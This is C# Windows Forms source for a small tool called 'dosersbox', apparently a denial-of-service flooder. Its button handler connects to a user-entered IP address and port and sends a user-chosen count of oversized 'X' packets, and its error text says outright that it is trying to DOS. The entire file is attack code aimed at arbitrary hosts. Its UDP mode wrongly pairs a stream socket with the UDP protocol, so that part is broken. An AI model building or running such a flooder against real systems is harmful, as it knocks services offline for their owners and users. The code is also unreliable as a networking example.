using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace dosersbox
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void dosbtn_Click(object sender, EventArgs e)
        {
            
           

            if (resb.Checked == true)
            {
                try
                {
                    byte[] messageSent = Encoding.ASCII.GetBytes(new string('X', (int)long.Parse(packetsize.Text)));
                    IPAddress ipAddr = IPAddress.Parse(ipadd.Text);

                    IPEndPoint localEndPoint = new IPEndPoint(ipAddr, (int)long.Parse(portin.Text));


                    // Creation TCP/IP Socket using  
                    // Socket Class Costructor 

                    Socket socket;

                    if (mode.SelectedItem == "UDP")
                    {
                        socket = new Socket(ipAddr.AddressFamily,
                               SocketType.Stream, ProtocolType.Udp);
                    }
                    else
                    {
                        socket = new Socket(ipAddr.AddressFamily,
                               SocketType.Stream, ProtocolType.Tcp);
                    }

                    socket.Connect(localEndPoint);

                    for (int i = 0; i < Int64.Parse(packetcount.Text); i++)
                    {
                        try
                        {
                            socket.Send(messageSent);
                        }
                        catch (System.Net.Sockets.SocketException)
                        {
                            MessageBox.Show("Remote Host closed the connection or an unexpected error occured", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }
                        
                    }



                    MessageBox.Show("Done!");
                }
                catch (Exception)
                {

                    MessageBox.Show("There was an error trying to DOS. Please check settings and retry", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);

                }
                
            }
            else
            {
                MessageBox.Show("You have to accept agrement", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);

            }
            
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://fedqxcode.wordpress.com/");
        }
    }
}
